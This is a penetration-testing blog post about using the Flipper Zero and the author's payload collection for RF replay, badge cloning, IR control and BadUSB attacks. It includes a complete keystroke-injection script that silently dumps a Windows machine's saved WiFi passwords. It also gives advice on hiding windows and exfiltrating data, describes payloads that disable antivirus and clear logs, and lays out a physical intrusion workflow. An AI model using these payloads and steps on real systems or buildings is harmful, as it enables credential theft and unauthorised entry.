# 🐬 Flipper Zero — The Swiss Army Knife That Fits in Your Pocket

*March 7, 2026 — by bad-antics*

---

If the WiFi Pineapple owns the airwaves, the Flipper Zero owns *everything else*. RF, infrared, NFC, RFID, iButton, GPIO, USB — it's a multi-tool for every wireless protocol that isn't WiFi, and it does USB attacks too. My [nullsec-flipper-suite](https://github.com/bad-antics/nullsec-flipper-suite) has 430+ files across every Flipper capability, and I've also built [PineFlip](https://github.com/bad-antics/pineflip) — a full desktop companion app in Rust/GTK4. Here's everything I've learned.

---

## What Makes the Flipper Zero Different

Most security tools do one thing well. The Flipper does a dozen things at a "good enough for the field" level — and that's exactly the point. You don't carry a dedicated RFID cloner, a separate IR blaster, a standalone SubGHz transceiver, a USB Rubber Ducky, and an NFC reader. You carry a Flipper.

**The hardware:**
- **Sub-1 GHz radio** (CC1101) — Transmit and receive on 315/433/868/915 MHz
- **125 kHz RFID** — Read and emulate low-frequency access cards
- **NFC (13.56 MHz)** — Read, save, and emulate NFC cards (Mifare, NTAG, etc.)
- **Infrared** — Universal remote for TVs, ACs, projectors, anything with an IR receiver
- **GPIO** — 18 pins for hardware hacking, UART, SPI, I2C
- **USB** — BadUSB/HID keyboard emulation
- **iButton** — Dallas/Cyfral contact key reading and emulation
- **Bluetooth** — BLE for mobile app communication
- **1.4" LCD** with a cute dolphin that levels up as you use it

The screen and the dolphin aren't gimmicks — they make the device **approachable**. Security tools are intimidating. A little animated dolphin that gets happy when you scan cards makes the learning curve feel less steep. Smart design choice by the Flipper team.

---

## SubGHz — The Most Misunderstood Feature

Everyone thinks SubGHz means "open any garage door." It doesn't. Here's the reality:

### What it CAN do:
- **Capture and replay static codes** — Older devices (some garage doors, ceiling fans, doorbells, power outlets) use fixed codes with no rolling mechanism. Capture the signal, replay it, done.
- **Brute force short codes** — Some devices use very short fixed codes (8-12 bit). The Flipper can cycle through all possible codes in seconds.
- **Signal analysis** — Even if you can't replay a signal, you can analyze its frequency, modulation, encoding, and protocol. Great for reverse engineering proprietary RF systems.
- **Custom protocol transmission** — With the right `.sub` file, you can transmit any arbitrary signal on supported frequencies.

### What it CANNOT do:
- **Rolling codes (KeeLoq, etc.)** — Modern garage doors and car key fobs use rolling codes. Each transmission uses a new code, and replaying a captured code won't work because the receiver has already moved past it. The stock firmware blocks this outright.
- **Encrypted protocols** — Anything with AES or proper crypto is off-limits.
- **High-power transmission** — The CC1101 is a low-power transceiver. Range is typically 10-50 meters depending on conditions. You're not jamming anything from across a parking lot.

### What makes my SubGHz collection useful:

My suite has 40 SubGHz files covering real-world targets:

```
garage_315mhz.sub      — US garage doors (fixed code, 315 MHz)
garage_390mhz.sub      — US garage doors (fixed code, 390 MHz)
eu_barrier_868.sub     — European parking barriers (868 MHz)
tesla_charge_port.sub  — Tesla charge port opener (315 MHz)
doorbell_433mhz.sub    — Wireless doorbells
restaurant_pager.sub   — Restaurant pager systems
ev_charger_unlock.sub  — EV charger unlock signals
scooter_unlock_433.sub — Electric scooter unlock
sprinkler_433.sub      — Sprinkler system control
```

The Tesla charge port one always gets attention. Yes, you can pop open a Tesla's charge port with a 315 MHz signal. No, this doesn't let you steal the car. It just opens the little charging flap. But it's a great demo of how even "smart" vehicles have dumb RF attack surfaces.

**Real-world use case:** During a physical pentest at a corporate campus, I used the Flipper to capture the parking gate signal from a legitimate employee's car. Fixed code, 433 MHz. Replayed it to enter the secured parking garage without credentials. That finding alone justified the entire engagement.

---

## BadUSB — 80 Payloads and Counting

The Flipper's BadUSB is essentially a Rubber Ducky built into the device. Plug it into a computer, it presents itself as a keyboard, and injects keystrokes from a DuckyScript payload.

My suite has **80 BadUSB payloads** organized by attack category:

### The Greatest Hits

**WiFi Password Stealer (Windows):**
```
REM Extracts all saved WiFi passwords
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1000
STRING netsh wlan show profiles | Select-String "All User" | ForEach-Object { $_.ToString().Split(":")[1].Trim() } | ForEach-Object { $pw = netsh wlan show profile name="$_" key=clear | Select-String "Key Content"; "$_ : $pw" } | Out-File "$env:TEMP\wifi_passes.txt"
ENTER
```

This is consistently the most popular payload in the suite. Five seconds of USB access = every WiFi password the machine has ever connected to. Most people don't realize Windows stores these in plaintext (well, DPAPI-protected, but accessible to the logged-in user).

**System Recon:**
Grabs hostname, username, domain, OS version, IP, MAC, AV product — the first thing you run during a physical pentest to understand what you've plugged into.

**Cross-Platform Coverage:**
I write payloads for Windows (the bulk), Linux, and macOS. The challenge with cross-platform payloads is that terminal invocation differs:
- **Windows:** `GUI r` → `powershell`
- **macOS:** `GUI SPACE` → `terminal`
- **Linux:** `CTRL ALT t` (or varies by DE)

DuckyScript 2.0 on the Flipper doesn't have native OS detection like DuckyScript 3.0 on the Rubber Ducky, so I write separate payloads per platform. It's more work but more reliable.

### Categories I'm Proud Of

**Cloud & DevOps (Payloads 41-50)** — These target AWS credential files, Docker secrets, Kubernetes service account tokens, Azure managed identities, GCP service account keys, and Terraform state files. In 2026, compromising cloud credentials from a developer's laptop is often more valuable than compromising the laptop itself.

**Defense Evasion (Payloads 61-70)** — Disabling Windows Defender, clearing event logs, DNS poisoning via the hosts file, creating rogue WiFi hotspots from the target machine. These payloads are designed to run *after* your initial access payload, cleaning up your tracks and establishing persistence.

### Writing Good BadUSB Payloads

**Timing is everything.** The `DELAY` values in DuckyScript are critical. Too short and the command runs before the window is ready. Too long and you're standing next to someone's computer for an awkwardly long time.

My defaults:
- `DELAY 1000` after plug-in (let the USB enumerate)
- `DELAY 500` after `GUI r` (let Run dialog open)
- `DELAY 1000` after launching PowerShell (let it initialize)

**Hide your windows.** Always use `powershell -w hidden` on Windows. A visible PowerShell window is an instant giveaway.

**Keep it short.** Every line of DuckyScript is a keystroke sequence. Each one takes time. The ideal BadUSB payload runs in under 10 seconds total. If you need complex logic, download and execute a script rather than typing it out character by character.

**Exfiltration matters.** Gathering data is easy. Getting it out is the hard part. My payloads use several methods:
- Write to a file on the Flipper's mass storage
- Upload to a webhook/pastebin
- DNS exfiltration for restrictive environments
- Write to `$env:TEMP` for later retrieval

---

## NFC & RFID — Access Control's Worst Nightmare

### RFID (125 kHz)

Low-frequency RFID is the backbone of building access control, and it's **shockingly insecure**. The three most common card types:

- **EM4100** — Read-only, no encryption, no authentication. The Flipper reads it, stores the UID, and emulates it perfectly. Clone in 2 seconds.
- **HID ProxII** — Same story. No crypto. Read and clone instantly.
- **Indala** — Slightly different encoding, same lack of security. Clonable.

**The field reality:** Most corporate offices in 2026 *still* use these cards. They cost pennies per card and the infrastructure is already installed. Upgrading to a secure system means replacing every reader and every card in the building.

My suite includes blank templates for all three formats. During a physical pentest, the workflow is:
1. Tail an employee through a door (or ask to "borrow" their badge for a second)
2. Read the card with the Flipper (takes 1-2 seconds, just hold it near the card)
3. Emulate the card to open doors

### NFC (13.56 MHz)

Higher frequency, more complex, but still attackable:

- **Mifare Classic** — The most common NFC card in access control. Crypto1 encryption, which was broken years ago. The Flipper can read all sectors if you know the keys (and default keys work on a disturbing number of deployments).
- **NTAG215** — Used in amiibo and some transit systems. No security. Read and write freely.
- **Mifare DESFire** — Actually secure. The Flipper can read the UID but not clone the card. This is what companies should be using.

My suite has blank Mifare Classic 1K, 4K, and NTAG215 templates for testing purposes.

---

## Infrared — The Forgotten Attack Surface

IR gets treated as a toy feature, but it's genuinely useful:

### TV-OFF Universal

My `TV_OFF_Universal.ir` file contains power-off codes for **18 different manufacturers** in a single file. Point the Flipper at any TV and cycle through the signals — Samsung, LG, Sony, Vizio, TCL, Hisense, and more. One of them will turn it off.

Practical applications beyond pranks:
- **Physical pentest:** Turn off TVs displaying security camera feeds in a lobby
- **Social engineering:** "Oh, the TV in the conference room died? Let me call IT..." — now you're in a conversation with an employee who thinks you belong there
- **Digital signage:** Many digital signs in corporate lobbies use consumer TVs. IR is their only control interface. Turn them off, display a "system compromised" message, demonstrate the risk

### AC & Projector Control

I have captures for Daikin, Samsung, and universal AC remotes. Being able to control the HVAC in a building from the hallway is a great pentest finding — imagine an attacker cranking the server room temperature to 40°C.

---

## The Firmware Ecosystem

One of the Flipper's greatest strengths is its **open firmware ecosystem**. The stock firmware is intentionally conservative — it blocks SubGHz replay on certain frequencies, limits some protocols, and keeps things legal-ish. But alternative firmwares unlock the full hardware:

### Major Firmwares

| Firmware | Philosophy |
|----------|-----------|
| **Official** | Conservative, legal-safe, stable. Good for learning. |
| **Momentum** | Community fork of Xtreme. Actively maintained, balanced between features and stability. Currently the most popular custom firmware. |
| **Unleashed** | Removes SubGHz frequency restrictions. Adds protocol support. Less opinionated about what you should/shouldn't do. |
| **Xtreme** | Feature-packed, lots of UI customization, app ecosystem. Development slowed in favor of Momentum. |
| **RogueMaster** | Kitchen-sink approach — includes everything from other firmwares plus additional apps and features. |

My suite is compatible with all of them. The DuckyScript files, SubGHz captures, and IR remotes work across any firmware. Some features (extended SubGHz frequencies, certain protocols) require custom firmware to use.

### My recommendation:
Start with **official** to learn the device. Switch to **Momentum** once you're comfortable. It's the best balance of features, stability, and active development as of March 2026.

---

## PineFlip — Why I Built a Desktop Companion App

The official qFlipper app works fine for basic file management and firmware updates. But I wanted more, so I built [PineFlip](https://github.com/bad-antics/pineflip) — a native Linux companion app in **Rust with GTK4/libadwaita**:

- **Live screen mirroring** — See your Flipper's display on your computer in real-time
- **Remote control** — Full D-pad control via keyboard. Write DuckyScript payloads on your laptop, deploy to the Flipper, test without touching it
- **File manager** — Drag-and-drop file management for the SD card. No more qFlipper for simple file transfers
- **Firmware management** — Switch between Official, Momentum, Unleashed, Xtreme, RogueMaster with one click
- **Screen recording** — Record your Flipper's screen to GIF for documentation/demos

Why Rust? Because a companion app for a security tool should itself be secure. No memory safety issues, no dependency hell, native performance. GTK4 + libadwaita gives it a native GNOME look.

I also built variants in other stacks for broader platform support:
- [pineflip-desktop-app](https://github.com/bad-antics/pineflip-desktop-app) — PyQt6 for Windows
- [pineflip-web-app](https://github.com/bad-antics/pineflip-web-app) — Flask web interface (access from any browser)
- [pineflip-manager-native](https://github.com/bad-antics/pineflip-manager-native) — C# WPF for Windows native
- [flipper-pineapple-desktop](https://github.com/bad-antics/flipper-pineapple-desktop) — C/Win32 combined Flipper + Pineapple manager

---

## Flipper + Pineapple — The Combo

This is where it gets fun. The Flipper Zero and WiFi Pineapple Pager complement each other perfectly:

| Flipper Zero | WiFi Pineapple |
|---|---|
| SubGHz, RFID, NFC, IR, USB | WiFi (2.4/5GHz) |
| Physical access (badges, gates) | Network access (WiFi attacks) |
| Quick hit (seconds) | Sustained ops (hours) |
| Passive + active RF | Active WiFi only |

**Combined pentest workflow:**

1. **Flipper:** Clone an employee's RFID badge in the elevator → gain physical building access
2. **Flipper:** BadUSB payload on an unattended workstation → grab WiFi credentials
3. **Pineapple:** Deploy evil twin using the captured WiFi SSID → capture more credentials from the air
4. **Flipper:** SubGHz replay to open the server room door (if using RF locks)
5. **Pineapple:** Plant the Pager as a persistent WiFi implant in the server room → long-term access
6. **Flipper:** IR to turn off the security camera monitor at the front desk on your way out

Two devices, total building compromise. That's why I manage both devices from a single interface in my companion apps.

---

## Building Your Own Flipper Payloads

### SubGHz

Capturing your own signals is easy:
1. **Sub-GHz** → **Read RAW** → Pick a frequency (433 MHz is a good start)
2. Press the button/remote you want to capture
3. Save the `.sub` file
4. Replay it later

For custom signals, the `.sub` file format is straightforward:
```
Filetype: Flipper SubGhz RAW File
Version: 1
Frequency: 433920000
Preset: FuriHalSubGhzPresetOok650Async
Protocol: RAW
RAW_Data: 500 -500 500 -500 500 -1000 ...
```

The `RAW_Data` is simply on/off timing in microseconds. Positive = transmit, negative = silence. You can craft signals by hand if you understand the protocol.

### Infrared

Capture with **Infrared** → **Learn New Remote**, or write `.ir` files manually:
```
name: Power
type: parsed_signal
protocol: NEC
address: 04 00 00 00
command: 08 00 00 00
```

The Flipper's IR library already knows most protocols (NEC, Samsung32, SIRC, RC5, RC6). If your target uses a known protocol, you just need the address and command bytes.

### BadUSB

Write DuckyScript in any text editor, save as `.txt`, drop it on the Flipper's SD card under `/badusb/`:

```
REM My payload
DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 500
STRING You've been flipped!
```

Test on your own machines first. DuckyScript timing varies wildly between fast and slow computers.

---

## Common Mistakes I See

1. **Not updating the firmware** — The official and custom firmwares update frequently with bug fixes and new protocol support. Update regularly.

2. **Expecting too much from SubGHz** — The Flipper won't open modern car doors. Stop trying. Use it for what it's good at: doorbells, fans, outlets, older garage doors, and signal analysis.

3. **Ignoring the GPIO** — The GPIO pins turn the Flipper into a hardware hacking Swiss army knife. UART to debug embedded devices, SPI to dump flash chips, I2C to talk to sensors. Most people never use this and it's the most powerful feature for hardware pentests.

4. **Not organizing SD card files** — Put your payloads in subdirectories. My suite uses `/badusb/nullsec/`, `/subghz/nullsec/`, etc. When you have 400+ files, organization matters.

5. **Transmitting on frequencies you shouldn't** — Know your country's regulations. 915 MHz LoRa is fine in the US, illegal in the EU (where 868 MHz is used instead). Custom firmwares remove frequency locks, but the laws still apply.

---

## What's Next for the Flipper

- **Flipper One** — The rumored successor with a more powerful radio, larger screen, and built-in WiFi. If it happens, it could merge the Flipper and Pineapple into a single device.
- **Better BLE attacks** — BLE support on the current Flipper is limited. Future firmware could enable BLE MITM, beacon spoofing, and device tracking.
- **App ecosystem maturity** — The Flipper app store is growing. More complex applications (full NFC relay attacks, automated pentest workflows) are becoming possible.
- **Integration with AI** — Imagine pointing the Flipper at a lock system and having it automatically identify the protocol, find known vulnerabilities, and suggest an attack path. It's not far off.

---

## Links

- [Flipper Zero Official](https://flipperzero.one)
- [Flipper Firmware (Official)](https://github.com/flipperdevices/flipperzero-firmware)
- [Momentum Firmware](https://github.com/Next-Flip/Momentum-Firmware)
- [Unleashed Firmware](https://github.com/DarkFlippers/unleashed-firmware)
- [NullSec Flipper Suite (430+ files)](https://github.com/bad-antics/nullsec-flipper-suite)
- [PineFlip Desktop App](https://github.com/bad-antics/pineflip)
- [NullSec Pineapple Suite (106 payloads)](https://github.com/bad-antics/nullsec-pineapple-suite)

---

*This post is part of the [NullSec Wiki](https://github.com/bad-antics/nullsec-wiki). For more tools and articles, see [bad-antics on GitHub](https://github.com/bad-antics).*
